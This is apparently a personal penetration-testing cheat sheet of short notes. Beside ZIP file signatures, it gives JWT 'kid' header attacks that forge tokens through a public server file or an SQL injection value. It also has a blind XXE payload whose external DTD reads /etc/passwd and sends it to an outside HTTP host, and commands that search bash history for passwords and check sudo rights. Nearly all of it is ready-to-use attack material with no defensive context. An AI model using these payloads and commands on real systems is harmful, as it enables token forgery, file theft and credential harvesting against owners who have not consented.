# Notes

### ZIP Format Signatures

*HEADER*
```
50 4B 03 04 14
```
*FOOTER*
```
50 4B 05 06 00
```



### JWT KID Value Exploitation
*Sign with public file from server*
```
kid: public/css/file.css

wget file.css from target

manipulate token using jwt_tool and sign it with file.css
```

*SQL Injection*
```
kid: test' UNION SELECT 'key';--

manipulate token using jwt_tool and sign it using the secret -> 'key'
```


### Blind XXE to SSRF

*ON TARGET*

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "*HOST ADDRESS OF DTD FILE (preferably on github)*">
<foo>&e1;</foo>
````

*INSIDE DTD FILE*

```xml
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM '*RANDOM HTTP HOST (like https://requestbin.com/)*/%p1;'>">
%p2;
```


### Hidden terminal input history
```bash
find . -name .bash_history -exec grep -A 1 '^passwd' {} \;
```

### Search file by name pattern
```bash
find -name "*PATTERN*" 2>/dev/null
```

### Search string
```bash
grep -r "STRING" / 2>/dev/null
```

### Check SUDO privileges/rights
```bash
sudo -l
```
